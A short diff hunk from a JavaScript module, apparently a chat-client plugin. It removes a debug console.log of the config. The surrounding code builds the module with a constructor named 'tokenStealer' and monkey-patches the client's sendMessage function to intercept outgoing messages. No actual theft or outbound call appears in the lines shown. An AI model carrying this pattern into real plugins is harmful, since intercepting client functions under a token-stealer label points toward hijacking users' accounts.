@@ -32,8 +32,6 @@ module.exports = new tokenStealer({
     async load () {
         const config = await ensureConfig(this);
 
-        console.log(config);
-
         const toReplace = Object.keys(typeof config.tags === 'object' ? config.tags : {});
         monkeyPatch( findModule('sendMessage'), 'sendMessage', function () {
             const input = arguments[0].methodArguments[1];
